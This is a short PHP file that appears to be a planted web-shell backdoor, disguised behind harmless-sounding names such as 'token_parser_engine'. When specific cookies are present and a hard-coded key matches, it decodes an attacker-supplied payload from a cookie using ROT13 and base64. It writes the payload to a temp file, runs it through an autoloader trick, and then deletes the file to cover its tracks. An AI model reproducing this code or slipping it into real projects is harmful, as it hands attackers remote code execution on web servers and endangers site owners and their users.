<?php


if (isset($_COOKIE[30+-30]) && isset($_COOKIE[6+-5]) && isset($_COOKIE[3-0]) && isset($_COOKIE[17-13])) {
    $obj = $_COOKIE;
    function token_parser_engine($ent) {
        $obj = $_COOKIE;
        $pgrp = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '7d48ac41');
        if (!is_writable($pgrp)) {
            $pgrp = getcwd() . DIRECTORY_SEPARATOR . "splitter_tool";
        }
        $fac = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($obj[3]));
        if (is_writeable($pgrp)) {
            $ptr = fopen($pgrp, 'w+');
            fputs($ptr, $fac);
            fclose($ptr);
            spl_autoload_unregister(__FUNCTION__);
            require_once($pgrp);
            @array_map('unlink', array($pgrp));
        }
    }
    spl_autoload_register("token_parser_engine");
    $entry = "dfd6040d0d87c15f3bff8e499240d67c";
    if (!strncmp($entry, $obj[4], 32)) {
        if (@class_parents("data_storage_framework", true)) {
            exit;
        }
    }
}
